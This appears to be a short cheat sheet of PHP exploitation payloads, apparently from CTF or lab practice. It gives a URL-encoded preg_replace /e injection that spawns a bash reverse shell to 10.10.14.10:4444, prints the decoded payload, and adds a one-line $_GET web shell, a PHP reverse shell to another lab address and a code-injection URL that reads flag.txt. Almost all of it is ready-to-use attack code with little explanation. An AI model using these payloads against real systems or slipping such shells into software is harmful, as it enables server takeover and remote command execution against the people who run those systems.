# PHP

Common exploits in PHP.

## Cookies

`PHPSESSID` is the default session cookie name.

## Bypass preg_replace

If we now there is something like a word filter, there is probably a `preg_replace` function. We can try to bypass it sending something in the word that is being replaced.

```
swearwords%5B%2Fdick%2Fe%5D=%73%79%73%74%65%6d%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%30%2f%34%34%34%34%20%30%3e%26%31%27%22%29%3bto=test%40local.com&subject=Test&message=%3Cp%3Edick%3C%2Fp%3E%3Cp%3Ebitch%3Cbr%3E%3C%2Fp%3E
```

The payload is 

```php
system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'");
```

But URL encoded.

## Web shell

```php
<?php system($_GET["cmd"]); ?>
```

## Reverse shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");?>
```

## Examples

```
http://<IP>:45338/?format=${system($_GET[id])}&id=cat%20../flag.txt
```